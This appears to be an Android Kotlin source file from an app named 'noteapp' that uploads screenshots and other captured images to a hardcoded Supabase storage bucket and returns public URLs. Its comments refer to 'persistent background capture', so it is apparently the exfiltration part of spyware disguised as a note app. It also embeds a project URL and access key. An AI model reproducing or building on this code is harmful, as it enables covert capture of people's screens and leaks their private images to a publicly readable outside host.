// SupabaseUploader.kt (Ensure this file is in com.example.noteapp.security and updated as below)
package com.example.noteapp.security

import android.content.Context
import android.graphics.Bitmap
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.io.ByteArrayOutputStream
import android.os.Environment

class SupabaseUploader(private val context: Context ) {

    companion object {
        private const val TAG = "SupabaseUploader"

        // 🔥 UPDATE THESE WITH YOUR VALUES FROM STEP 2 & 3 🔥
        private const val SUPABASE_URL = "https://xasssvbetpazjpstpsdn.supabase.co"  // From Step 2
        private const val SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhhc3NzdmJldHBhempwc3Rwc2RuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNDQxNTAsImV4cCI6MjA4MzgyMDE1MH0.JzyxcYRmFTDT3kqe_Ymujtr3s-VNDtw_fw7wbp-P3-E"  // From Step 3
        private const val BUCKET_NAME = "noteapp"  // Your bucket name
    }

    private val httpClient = OkHttpClient.Builder( )
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    suspend fun uploadFile(file: File, category: String = "security"): String? = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Uploading to Supabase: ${file.name} (${file.length()} bytes)")

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "${category}/${timestamp}_${file.name}"

            val request = Request.Builder()
                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_NAME/$fileName")
                .post(file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .header("Authorization", "Bearer $SUPABASE_ANON_KEY")
                .header("Content-Type", "application/octet-stream")
                .build()

            val response = httpClient.newCall(request ).execute()

            if (response.isSuccessful) {
                val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_NAME/$fileName"
                Log.d(TAG, "✅ File uploaded to Supabase: $publicUrl")
                publicUrl
            } else {
                val errorBody = response.body?.string()
                Log.e(TAG, "❌ Supabase upload failed: ${response.code} - $errorBody")
                // Removed local fallback as it's not needed for persistent background capture
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Supabase error: ${e.message}", e)
            null
        }
    }

    // Removed saveToAccessibleStorage as it's not needed for persistent background capture

    suspend fun uploadBitmap(bitmap: Bitmap, filename: String, category: String = "security"): String? {
        return try {
            val baos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 80, baos)

            val tempFile = File(context.cacheDir, "${filename}_${System.currentTimeMillis()}.png")
            tempFile.writeBytes(baos.toByteArray())

            val result = uploadFile(tempFile, category)
            tempFile.delete()
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading bitmap", e)
            null
        }
    }

    suspend fun uploadScreenshot(file: File): String? = uploadFile(file, "screenshots")
    suspend fun uploadRandomImage(file: File): String? = uploadFile(file, "random")
}
